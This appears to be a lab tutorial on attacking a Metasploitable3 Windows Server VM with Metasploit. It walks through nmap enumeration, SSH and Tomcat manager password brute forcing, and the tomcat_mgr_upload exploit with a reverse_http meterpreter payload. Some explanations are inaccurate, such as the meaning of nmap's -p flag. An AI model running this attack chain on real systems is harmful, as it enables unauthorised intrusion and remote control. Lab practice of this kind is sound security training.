
We will first look into Workspaces in Kali Linux. Workspaces are used to separate the work you are doing. When you are trying to exploit a machine, you would want to enumerate the machine. Enumeration basically means gathering as much information that you can using passive scanning or OSINT. 

Inside msfconsole, when you type $`workspace`, it will tell you which workspace you are in. If you want to know how many workspaces you have and which one you are working in you use $`workspace -v`. 

If you need to create a new workspace then you type $`workspace -a test`. The asterisk symbol is pointing to the workspace that you are currently in. If you need to delete a workspace then $`workspace -d name`. If you want to change the workspace then you just type $`workspace name`

We do this in order to keep track of all the work that we are doing without getting things too confusing between them. If we need to learn more about workspace $`help workspace`

 Inside msfconsole, we run an nmap scan as now we are trying to exploit another machine which is in the same network. In our case metasploitable3 which is a Windows Server 08. So we will run an nmap scan in order to find out more about the scan. Nmap is an aggressive scanner so we do not use Nmap in the wild unless we want to go to jail. DO NOT USE IT WITHOUT PERMISSION. 
 
 $` msf6 > db_nmap -p- -sV -O 10.0.2.6` (the -p stands for open ports, -sV stands for services running, -O stands for the Operating system, the IP address will be the one of your target machine, in our case the Windows Server 08 Metasploitable3) Use the Ip address of the machine you are trying to find out. Nmap takes a while for the results to come back, so be patient. 
 
 If we type $`hosts` or $`notes` or $`services` it will give us more information such as the os name, IP address and mac address of the target machine and the pupose as well, whether it is a workstation or a server. 
 
 `Bruteforcing(SSH) Into Windows8 with Kali Linux` 
 
 Once we run an nmap we will get a list of services that are open and ports that are open. In the enumeration process when we find the information we can look for ways to bruteforce. When we ran nmap scan we can see in our particular Windows Server 08 that `ssh` port is open, so we will try and brute force the machine. We will now look for auxillary ssh scanners. 
 
 Our first step here is to look for aux ssh in msfconsole. We type $`msf6 > search type:aux ssh` We will get a list of scanners. We will find the one that will help us with our intent. In our case we are trying to brute force we will use the $`auxillary/scanner/ssh/ssh_login`. We either type $` use and the whole name or number in our case use 15`. If successful, we will see the scanner in red, which means we are inside it now. We will do $`show options` so that we can see what are the parameters that need to be set in order to get the job done. We will pay special attention to the $`yes` on $`Required` field. 

First thing we need to do is set the rhost. To do so, we type in $`set rhost 10.0.2.8` (In our case the ip address we are trying to ssh into is 10.0.2.8). In this particular case we will also $`set user_as_pass true`. We do this so that from the wordlists, it will try the username as password as well while bruteforcing. Now we will give the exploit the path for the filename which we will be using in order to try different passwords. We do that by typing $`set user_file /usr/share/wordlists/metasploit/unix_users.txt` . We will do show options one more time just to make sure that we have set all the corret parameters. We hit $`run` after this. if successful, it will tell us whether it was successful or not. If we are, then we hit $`ctrl+z` and get out of msfconsole. this only suspends the msfconsole. Once we get out, we will type $`ssh vagrant@10.0.2.8` It will prompt you for your password and you are in. 



`Exploiting an Apache Tomcat Server`

Apache Tomcat is an open-source Java Servlet and Java Server page container that lets developers implement an array of enterprise java applications. Tomcat also runs a HTTP web server environment in which Java code can run. 

So from our enumeration that we did in the workspace, we see that the Apache Tomcat server port 8282 is open. 

 ![open ports](https://user-images.githubusercontent.com/93686063/201373243-96e32798-b879-471e-b704-313bcd199a87.JPG)

After we have run nmap in our target host, we get a list of the IP addresses and the ports that are open, so we can have an idea of the ports that can be exploited. 

If we go to a browser in our kali machine and type in the ip address and port in the following way $`10.0.2.8:8282` This is the Tomcat server page, this is where the tomcat is listening. This would be an example of manual enumeration, we just put in the IP address and the port and we can see what is listening. 

In our last example we used a wordlists but now we will create our own wordlists, this is an example of us already knowing the username and password or trying to guess the username and password based on the OSINT that we have done to accurately guess the password while we are trying to brute force. There are a lot of wordlists out there which can help us to crack passwords. Below is an example of the wordlists we have in Kali Linux with common words used to usernames and passwords. The wordlist can be either a .txt file or .csv file. 



![wordlists](https://user-images.githubusercontent.com/93686063/201375979-c97a72ce-4fa5-4619-8bc0-21a0e8ac0461.JPG)

In order to create a wordlists we will go to the folder metsploit so that we can use the file in order to brute force the machine. We will open a new tab and use the nano command. $`nano hello.txt`. This will open a text file editor where we will use words which we think will be able to brute force the system successfullly. our magic word is $`sploit`. 

Now we go back to metasploit and look for a scanner. We type in $`search type: aux tomcat`. Below are the results. 

![tomcat aux](https://user-images.githubusercontent.com/93686063/201379322-41dd0e8c-fa91-45f1-b9bb-8aaec4d36156.JPG)

Among the options that we have, we will be using the $`mgr_login` module. Either type $`use 7` or $`use the explpit`. Once we are inside the module it will turn red. We will now do $`info` to see what the module does and what we need in order to exploit the module. We will first set the Rhost. $`set rhost 10.0.2.8` and we will set the Rport $`set rport 8282`. THe Rport has to be the port that the tomcat is listening on, if not we have to change it. By default mine was 8080, hence I changed it to 8282. We will also change the user_file to the file we created earlier with words we think will be able to break the machine. We will also set the user_as_pass file as True, so that it tries the same word as username and password. After we set all the parameters, we hit $`run`. The brute force begins and should display the following result. 

![run](https://user-images.githubusercontent.com/93686063/201382661-a9babdd5-0e20-404b-bbe1-ddbd03e30606.JPG)

We can see in the picture above that it found a successful login for our Tomcat Server. Now we will use the credentials we found in order to break into the Tomcat Server. 

We hit $`back` in order to get to the msfconsole. We will look for an exploit to upload a shell to the Server. 

$`msf6 > search type:exploit tomcat_mgr_upload` When we hit this we will find an exploit. We use that exploit. Once we get inside that exploit, like before we hit info in order to find what are the parameters that we need to set in order to exploit the server. 

The usual are $`Rhosts` and $`Rports` that we need to set in order to get the shell. THis one however some extra things such as targets. It will say Available Targets and they are $`0 Java Universal` or $`1 Windows Universal` or $`2 Linux x86`. Since we are exploiting a Windows system we will be using $`1`. 

We also need to set $`HttpPassword` and $`HttpUsername` and this is where the credential we found earlier that we found. $`sploit` is the word we will be using in order to exploit the system that we found in the earlier process. Now we need to change the Payload options. We will type $`set payload as reverse_http` and not $`reverse_tcp`. 

Now in order to set the target we do $`Set Target 1`. we do options we can see the target change. If all of our parameters are correct. We hit $`run` We should get the meterpreter shell. 



